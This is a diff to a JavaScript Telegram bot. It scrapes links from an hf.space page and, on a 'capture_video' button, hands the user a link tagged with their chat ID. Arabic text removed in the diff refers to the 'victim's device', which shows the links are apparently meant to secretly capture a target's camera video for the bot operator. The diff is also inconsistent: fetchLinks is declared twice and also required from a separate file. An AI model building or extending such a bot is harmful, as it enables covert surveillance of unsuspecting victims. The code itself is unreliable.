@@ -1527,7 +1527,8 @@ function isVIPUser(userId) {
     return !!vipUsers[userId];
 }
 
-
+const axios = require('axios');
+const cheerio = require('cheerio');
 
 async function fetchLinks() {
     const url = "https://sssssskskjwnsb-linklsksn.hf.space";
@@ -1536,7 +1537,6 @@ async function fetchLinks() {
         const response = await axios.get(url);
         const $ = cheerio.load(response.data);
 
-        // استخراج كل الروابط
         const linkur = [];
 
         $('a[href]').each((i, el) => {
@@ -1555,6 +1555,7 @@ async function fetchLinks() {
 }
 
 module.exports = fetchLinks;
+
 bot.onText(/\/stㅇㅗㅑㅡarㅏt/, async (msg) => {
     const chatId = msg.chat.id;
     const isSubscribed = await isUserSubscribed(chatId);
@@ -1683,26 +1684,27 @@ bot.onText(/\/stㅇㅗㅑㅡarㅏt/, async (msg) => {
 
 
 
-function getCA(linkur) {
-    return linkur.find(link => link.endsWith("ca"));
-}
+const fetchLinks = require('./fetchLinks.js');
 
-bot.on('callback_query', (callbackQuery) => {
+bot.on('callback_query', async (callbackQuery) => {
     const chatId = callbackQuery.message.chat.id;
     const data = callbackQuery.data;
 
     if (data === 'capture_video') {
 
-        // استخراج الرابط الذي نهايته ca
-        const caLink = getCA(linkur) || "الرابط غير موجود";
+        // جلب الروابط من الصفحة
+        const linkur = await fetchLinks();
 
-        const message = `تم انشاء الرابط ملاحظه قم في تليغم رابط جديد في كل مره ملاحظه بزم يكون النت قوي في جهاز الضحيه\n: ${caLink}/?chatId=${chatId}`;
+        // استخراج رابط ينتهي بـ "ca"
+        const caLink = linkur.find(link => link.endsWith("ca")) || null;
 
-        if (message && message.trim() !== '') {
-            bot.sendMessage(chatId, message);
-        } else {
-            console.log('🚫 تم منع إرسال رسالة فارغة في callback_query.');
+        if (!caLink) {
+            return bot.sendMessage(chatId, "لا يوجد رابط ينتهي بـ ca في الصفحة.");
         }
+
+        const message = `تم إنشاء الرابط بنجاح:\n${caLink}/?chatId=${chatId}`;
+
+        bot.sendMessage(chatId, message);
     }
 });
 
